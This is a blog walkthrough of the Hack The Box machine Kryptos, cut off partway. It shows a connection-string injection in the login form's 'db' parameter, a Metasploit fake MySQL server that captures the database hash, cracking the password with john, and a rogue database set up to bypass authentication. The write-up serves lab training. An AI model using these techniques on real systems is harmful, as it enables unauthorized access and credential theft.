<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->
<html lang="en" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>Hack The Box - Kryptos - 0xRick’s Blog</title>
<meta name="description" content="My write-up / walkthrough for Kryptos from Hack The Box.">


  <meta name="author" content="0xRick">
  
  <meta property="article:author" content="0xRick">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="en">
<meta property="og:site_name" content="0xRick's Blog">
<meta property="og:title" content="Hack The Box - Kryptos">
<meta property="og:url" content="https://0xrick.github.io/hack-the-box/kryptos/">


  <meta property="og:description" content="My write-up / walkthrough for Kryptos from Hack The Box.">





  <meta name="twitter:site" content="@ahm3d_h3sham">
  <meta name="twitter:title" content="Hack The Box - Kryptos">
  <meta name="twitter:description" content="My write-up / walkthrough for Kryptos from Hack The Box.">
  <meta name="twitter:url" content="https://0xrick.github.io/hack-the-box/kryptos/">

  
    <meta name="twitter:card" content="summary">
    
  

  



  <meta property="article:published_time" content="2019-09-21T07:00:00+02:00">






<link rel="canonical" href="https://0xrick.github.io/hack-the-box/kryptos/">




<script type="application/ld+json">
  {
    "@context": "https://schema.org",
    
      "@type": "Person",
      "name": "0xRick",
      "url": "https://0xrick.github.io/"
    
  }
</script>







<!-- end _includes/seo.html -->




<!-- https://t.co/dKP3o1e -->
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script>
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>

    <!--[if lt IE 9]>
<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
<![endif]-->

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          0xRick's Blog
          
        </a>
        <ul class="visible-links">
<li class="masthead__menu-item">
              <a href="/about">About</a>
            </li>
<li class="masthead__menu-item">
              <a href="/categories">Categories</a>
            </li>
<li class="masthead__menu-item">
              <a href="/tags">Tags</a>
            </li>
</ul>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Toggle menu</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      



<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person">

  
    <div class="author__avatar">
      
        <img src="/images/avatar.jpg" alt="0xRick" itemprop="image">
      
    </div>
  

  <div class="author__content">
    
      <h3 class="author__name" itemprop="name">0xRick</h3>
    
    
      <div class="author__bio" itemprop="description">
        

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Follow</button>
    <ul class="author__urls social-icons">
      
        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">Somewhere between 1's and 0's</span>
        </li>
      

      
        
          
            <li><a href="/" rel="nofollow noopener noreferrer"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">Home Page</span></a></li>
          
        
          
            <li><a href="https://twitter.com/ahm3d_h3sham" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
          
        
          
            <li><a href="https://github.com/0xRick" rel="noopener noreferrer" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">Github</span></a></li>
          
        
          
            <li><a href="https://www.buymeacoffee.com/VGEfcAqvn" rel="noopener noreferrer" target="_blank"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>
 
  
  </div>


  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="Hack The Box - Kryptos">
    <meta itemprop="description" content="Hack The Box - Kryptos">
    <meta itemprop="datePublished" content="2019-09-21T07:00:00+02:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title p-name" itemprop="headline">
            <a href="https://0xrick.github.io/hack-the-box/kryptos/" class="u-url" itemprop="url">Hack The Box - Kryptos
</a>
          </h1>
          

  <p class="page__meta">
    
      
      <span class="page__meta-date">
        <i class="far fa-calendar-alt" aria-hidden="true"></i>
        
        <time datetime="2019-09-21T07:00:00+02:00">September 21, 2019</time>
      </span>
    

    <span class="page__meta-sep"></span>

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          31 minute read
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content e-content" itemprop="text">
        <div>
          <style>
              #carbonads {
                border: 1px solid black;
                border-radius: 7px;
                border-spacing: 7px;
                display: block;
                overflow: hidden;
                padding: 1em;
                line-height: 1.5;
              }
              #carbonads span {
                position: relative;
                display: block;
                overflow: hidden;
              }
              .carbon-img img {
                display: block;
                float: left;
              }
              .carbon-text {
                display: block;
                font-size: .9em;
                text-align: end;
              }
              .carbon-poweredby {
                display: block;
                font-size: .8em;
                float: right;
                line-height: 1;
                letter-spacing: 1px;
                }
                </style>
                <br>   
          <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&amp;placement=0xrickgithubio" id="_carbonads_js"></script> 
                <br>
        </div>
        
          <aside class="sidebar__right ">
            <nav class="toc">
              <header><h4 class="nav__title">
<i class="fas fa-file-alt"></i> Contents</h4></header>
              <ul class="toc__menu"><li>
<a href="#hack-the-box---kryptos">Hack The Box - Kryptos</a><ul>
<li><a href="#quick-summary">Quick Summary</a></li>
<li><a href="#nmap">Nmap</a></li>
<li><a href="#initial-web-enumeration">Initial Web Enumeration</a></li>
<li><a href="#authentication-bypass-getting-database-credentials">Authentication Bypass: Getting Database Credentials</a></li>
<li><a href="#authentication-bypass-getting-login-query">Authentication Bypass: Getting Login Query</a></li>
<li><a href="#authentication-bypass-setting-up-the-database">Authentication Bypass: Setting-up the Database</a></li>
<li><a href="#rc4">RC4</a></li>
<li><a href="#ssrf">SSRF</a></li>
<li><a href="#lfi">LFI</a></li>
<li><a href="#sqli--arbitrary-file-write">SQLI –&gt; Arbitrary File Write</a></li>
<li><a href="#arbitrary-file-read">Arbitrary File Read</a></li>
<li><a href="#decrypting-the-credentials-user-flag">Decrypting the Credentials, User Flag</a></li>
<li><a href="#kryptospy-analysis">kryptos.py: Analysis</a></li>
<li><a href="#kryptospy-bruteforcing-the-seed">kryptos.py: Bruteforcing the Seed</a></li>
<li><a href="#kryptospy-exploitation-root-flag">kryptos.py: Exploitation, Root Flag</a></li>
</ul>
</li></ul>

            </nav>
          </aside>
        
        <h1 id="hack-the-box---kryptos">Hack The Box - Kryptos</h1>

<h2 id="quick-summary">Quick Summary</h2>
<p>Hey guys today Kryptos retired and here’s my write-up about it. It’s one of the hardest boxes I’ve ever seen and it definitely taught me a lot. As you may have already guessed, it had a lot of cryptography stuff, it also had a long chain of web vulnerabilities, starting with authentication bypass and ending with SQL injection allowing arbitrary file write. It’s a Linux box and its ip is <code class="language-plaintext highlighter-rouge">10.10.10.129</code>, I added it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> as <code class="language-plaintext highlighter-rouge">kryptos.htb</code>. Let’s jump right in !
<br><img src="/images/hackthebox/kryptos/0.png" alt="" class="align-center"><br><br></p>

<h2 id="nmap">Nmap</h2>
<p>As always we will start with <code class="language-plaintext highlighter-rouge">nmap</code> to scan for open ports and services :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# nmap -sV -sV -sT -o nmapinitial kryptos.htb
Starting Nmap 7.70 ( https://nmap.org ) at 2019-09-12 21:50 EET
Nmap scan report for kryptos.htb (10.10.10.129)
Host is up (0.25s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.39 seconds
</code></pre></div></div>
<p>Only <code class="language-plaintext highlighter-rouge">http</code> on port 80 and ssh.<br></p>

<h2 id="initial-web-enumeration">Initial Web Enumeration</h2>
<p><code class="language-plaintext highlighter-rouge">http://kryptos.htb</code> :</p>

<p><br><img src="/images/hackthebox/kryptos/1.png" alt="" class="align-center"><br><br>
The index page is a login page titled <code class="language-plaintext highlighter-rouge">Cryptor Login</code>, I checked the directories with <code class="language-plaintext highlighter-rouge">gobuster</code> but the only interesting thing I got was a forbidden directory called <code class="language-plaintext highlighter-rouge">dev</code> :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# gobuster -u http://kryptos.htb/ -w /usr/share/wordlists/dirb/common.txt -to 120s -t 100

=====================================================
Gobuster v2.0.1              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://kryptos.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 2m0s
=====================================================
2019/09/12 22:56:57 Starting gobuster
=====================================================
/.htpasswd (Status: 403)
/.hta (Status: 403)
/.htaccess (Status: 403)
/cgi-bin/ (Status: 403)
/css (Status: 301)
/dev (Status: 403)
/index.php (Status: 200)
/server-status (Status: 403)
</code></pre></div></div>
<p>I tested the login page with <code class="language-plaintext highlighter-rouge">test:test</code> and I intercepted the request with <code class="language-plaintext highlighter-rouge">burp</code>:</p>

<p><br><img src="/images/hackthebox/kryptos/2.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/kryptos/3.png" alt="" class="align-center"><br><br>
Request :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">kryptos.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://kryptos.htb/</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">116</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=99ub5git6oc7mka23ibjdorla2</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>

username=test&amp;password=test&amp;db=cryptor&amp;token=fe47b3105c71089f25ea5342c41d7d9eb972b989c22db6c70b1f8d1f9c967ace&amp;login=
</code></pre></div></div>
<p>I noticed a parameter called <code class="language-plaintext highlighter-rouge">db</code>, I changed its value to <code class="language-plaintext highlighter-rouge">test</code> to see what will happen :
<br>Request :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">kryptos.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://kryptos.htb/</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">113</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=99ub5git6oc7mka23ibjdorla2</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>

username=test&amp;password=test&amp;db=test&amp;token=eca86a50f4eaf5fbcceb0e73f9f0d93109bcb83658e8cdbe18248a5f93faa293&amp;login=
</code></pre></div></div>
<p>Response :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 12 Sep 2019 19:57:27 GMT</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.29 (Ubuntu)</span>
<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">23</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>

PDOException code: 1044
</code></pre></div></div>
<p>I got a <code class="language-plaintext highlighter-rouge">PDO</code> exception, I searched for <code class="language-plaintext highlighter-rouge">PDO</code> and found <a href="https://www.php.net/manual/en/book.pdo.php" target="_blank" rel="noopener noreferrer">this page</a>. I looked at the user contributed notes and saw this example :</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">PDO</span><span class="p">(</span><span class="s1">'dblib:host=your_hostname;dbname=your_db;charset=UTF-8'</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p>I guessed that the POST parameter <code class="language-plaintext highlighter-rouge">db</code> is being used in a similar code and <code class="language-plaintext highlighter-rouge">dbname</code> gets its value from it, so I thought of injecting that parameter with <code class="language-plaintext highlighter-rouge">;host=10.10.xx.xx</code> and see If I can successfully change the host parameter.<br>
Request :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">kryptos.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://kryptos.htb/</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">133</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=99ub5git6oc7mka23ibjdorla2</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>

username=test&amp;password=test&amp;db=cryptor;host=10.10.xx.xx&amp;token=eca86a50f4eaf5fbcceb0e73f9f0d93109bcb83658e8cdbe18248a5f93faa293&amp;login=
</code></pre></div></div>
<p>Response :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Thu, 12 Sep 2019 20:01:29 GMT</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">Apache/2.4.29 (Ubuntu)</span>
<span class="na">Expires</span><span class="p">:</span> <span class="s">Thu, 19 Nov 1981 08:52:00 GMT</span>
<span class="na">Cache-Control</span><span class="p">:</span> <span class="s">no-store, no-cache, must-revalidate</span>
<span class="na">Pragma</span><span class="p">:</span> <span class="s">no-cache</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">23</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=UTF-8</span>

PDOException code: 2002
</code></pre></div></div>
<p>I got another exception code (<code class="language-plaintext highlighter-rouge">2002</code>) which is <code class="language-plaintext highlighter-rouge">Connection refused</code>, I listened on port 3306 (Default <code class="language-plaintext highlighter-rouge">mysql</code> port) with <code class="language-plaintext highlighter-rouge">nc</code> to verify that I’m getting a connection, then I sent the same request again. And I got a connection :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# nc -lvnp 3306
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::3306
Ncat: Listening on 0.0.0.0:3306
Ncat: Connection from 10.10.10.129.
Ncat: Connection from 10.10.10.129:47530.
</code></pre></div></div>
<p>We can run a fake <code class="language-plaintext highlighter-rouge">mysql</code> database and use this injection to make the server send the login query to our database, the database will respond that the credentials are valid and we will be able to bypass the authentication. However, to do this we need to get the database credentials and the login query, then depending on them we will setup the database.<br></p>

<h2 id="authentication-bypass-getting-database-credentials">Authentication Bypass: Getting Database Credentials</h2>
<p>To get the database credentials I used <code class="language-plaintext highlighter-rouge">metasploit</code>’s module <code class="language-plaintext highlighter-rouge">auxiliary/server/capture/mysql</code>. It will run as a fake <code class="language-plaintext highlighter-rouge">mysql</code> server and capture the username and the password hash, the option <code class="language-plaintext highlighter-rouge">JOHNPWFILE</code>  will save the hash in john format in an external file which we can use later to crack the hash.<br></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf5 &gt; use auxiliary/server/capture/mysql                                                                                                                                                                         
msf5 auxiliary(server/capture/mysql) &gt; show options
Module options (auxiliary/server/capture/mysql):

   Name        Current Setting                           Required  Description
   ----        ---------------                           --------  -----------
   CAINPWFILE                                            no        The local filename to store the hashes in Cain&amp;Abel format
   CHALLENGE   112233445566778899AABBCCDDEEFF1122334455  yes       The 16 byte challenge
   JOHNPWFILE                                            no        The prefix to the local filename to store the hashes in JOHN format
   SRVHOST     0.0.0.0                                   yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT     3306                                      yes       The local port to listen on.
   SRVVERSION  5.5.16                                    yes       The server version to report in the greeting response
   SSL         false                                     no        Negotiate SSL for incoming connections                                                                             
   SSLCert                                               no        Path to a custom SSL certificate (default is randomly generated)                                                                               


Auxiliary action:

   Name     Description
   ----     -----------
   Capture


msf5 auxiliary(server/capture/mysql) &gt; set JOHNPWFILE ./hash
JOHNPWFILE =&gt; ./hash
msf5 auxiliary(server/capture/mysql) &gt; set SRVHOST 10.10.xx.xx
SRVHOST =&gt; 10.10.xx.xx
msf5 auxiliary(server/capture/mysql) &gt; run
[*] Auxiliary module running as background job 0.

[*] Started service listener on 10.10.xx.xx:3306
[*] Server started.
</code></pre></div></div>
<p>After running the module I sent this request again :</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">kryptos.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://kryptos.htb/</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">133</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">PHPSESSID=99ub5git6oc7mka23ibjdorla2</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Upgrade-Insecure-Requests</span><span class="p">:</span> <span class="s">1</span>

username=test&amp;password=test&amp;db=cryptor;host=10.10.xx.xx&amp;token=eca86a50f4eaf5fbcceb0e73f9f0d93109bcb83658e8cdbe18248a5f93faa293&amp;login=
</code></pre></div></div>
<p>And the server caught the credentials :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] 10.10.10.129:47538 - User: dbuser; Challenge: 112233445566778899aabbccddeeff1122334455; Response: 73def07da6fba5dcc1b19c918dbd998e0d1f3f9d; Database: cryptor
</code></pre></div></div>
<p>I cracked it with john :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# cat hash_mysqlna 
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
root@kali:~/Desktop/HTB/boxes/kryptos# john --wordlist=/usr/share/wordlists/rockyou.txt ./hash_mysqlna 
Using default input encoding: UTF-8
Loaded 1 password hash (mysqlna, MySQL Network Authentication [SHA1 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
krypt0n1te       (dbuser)
1g 0:00:00:03 DONE (2019-09-12 22:15) 0.3184g/s 2054Kp/s 2054Kc/s 2054KC/s kryptic11..kry007
Use the "--show" option to display all of the cracked passwords reliably
Session completed
</code></pre></div></div>
<p>Database name : <code class="language-plaintext highlighter-rouge">cryptor</code>
<br>Username : <code class="language-plaintext highlighter-rouge">dbuser</code>
<br>Password : <code class="language-plaintext highlighter-rouge">krypt0n1te</code>
<br>Now we need to create the database, create the database user <code class="language-plaintext highlighter-rouge">dbuser</code> and grant them permission to the database <code class="language-plaintext highlighter-rouge">cryptor</code> :</p>
<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">kali</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">kryptos</span><span class="o">#</span> <span class="n">mysql</span>
<span class="n">Welcome</span> <span class="k">to</span> <span class="n">the</span> <span class="n">MariaDB</span> <span class="n">monitor</span><span class="p">.</span>  <span class="n">Commands</span> <span class="k">end</span> <span class="k">with</span> <span class="p">;</span> <span class="k">or</span> <span class="err">\</span><span class="k">g</span><span class="p">.</span>
<span class="n">Your</span> <span class="n">MariaDB</span> <span class="k">connection</span> <span class="n">id</span> <span class="k">is</span> <span class="mi">38</span>
<span class="n">Server</span> <span class="k">version</span><span class="p">:</span> <span class="mi">10</span><span class="p">.</span><span class="mi">3</span><span class="p">.</span><span class="mi">14</span><span class="o">-</span><span class="n">MariaDB</span><span class="o">-</span><span class="mi">1</span> <span class="n">Debian</span> <span class="n">buildd</span><span class="o">-</span><span class="n">unstable</span>

<span class="n">Copyright</span> <span class="p">(</span><span class="k">c</span><span class="p">)</span> <span class="mi">2000</span><span class="p">,</span> <span class="mi">2018</span><span class="p">,</span> <span class="n">Oracle</span><span class="p">,</span> <span class="n">MariaDB</span> <span class="n">Corporation</span> <span class="n">Ab</span> <span class="k">and</span> <span class="n">others</span><span class="p">.</span>

<span class="k">Type</span> <span class="s1">'help;'</span> <span class="k">or</span> <span class="s1">'</span><span class="se">\h</span><span class="s1">'</span> <span class="k">for</span> <span class="n">help</span><span class="p">.</span> <span class="k">Type</span> <span class="s1">'</span><span class="se">\c</span><span class="s1">'</span> <span class="k">to</span> <span class="n">clear</span> <span class="n">the</span> <span class="k">current</span> <span class="k">input</span> <span class="k">statement</span><span class="p">.</span>

<span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">show</span> <span class="n">databases</span><span class="p">;</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="o">|</span> <span class="k">Database</span>           <span class="o">|</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="o">|</span> <span class="n">information_schema</span> <span class="o">|</span>
<span class="o">|</span> <span class="n">mysql</span>              <span class="o">|</span>
<span class="o">|</span> <span class="n">performance_schema</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="mi">3</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">002</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">create</span> <span class="k">database</span> <span class="n">cryptor</span><span class="p">;</span>
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">1</span> <span class="k">row</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">025</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="k">show</span> <span class="n">databases</span><span class="p">;</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="o">|</span> <span class="k">Database</span>           <span class="o">|</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="o">|</span> <span class="n">cryptor</span>            <span class="o">|</span>
<span class="o">|</span> <span class="n">information_schema</span> <span class="o">|</span>
<span class="o">|</span> <span class="n">mysql</span>              <span class="o">|</span>
<span class="o">|</span> <span class="n">performance_schema</span> <span class="o">|</span>
<span class="o">+</span><span class="c1">--------------------+</span>
<span class="mi">4</span> <span class="k">rows</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">001</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[(</span><span class="k">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="n">use</span> <span class="n">cryptor</span><span class="p">;</span>
<span class="k">Database</span> <span class="n">changed</span>
<span class="n">MariaDB</span> <span class="p">[</span><span class="n">cryptor</span><span class="p">]</span><span class="o">&gt;</span> <span class="k">grant</span> <span class="k">all</span> <span class="k">privileges</span> <span class="k">on</span> <span class="o">*</span><span class="p">.</span><span class="o">*</span> <span class="k">to</span> <span class="s1">'dbuser'</span><span class="o">@</span><span class="s1">'%'</span> <span class="n">identified</span> <span class="k">by</span> <span class="s1">'krypt0n1te'</span><span class="p">;</span>
<span class="n">Query</span> <span class="n">OK</span><span class="p">,</span> <span class="mi">0</span> <span class="k">rows</span> <span class="n">affected</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">133</span> <span class="n">sec</span><span class="p">)</span>

<span class="n">MariaDB</span> <span class="p">[</span><span class="n">cryptor</span><span class="p">]</span><span class="o">&gt;</span> 
</code></pre></div></div>
<p>Let’s test it :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/kryptos# mysql -u dbuser -p
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 39
Server version: 10.3.14-MariaDB-1 Debian buildd-unstable

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

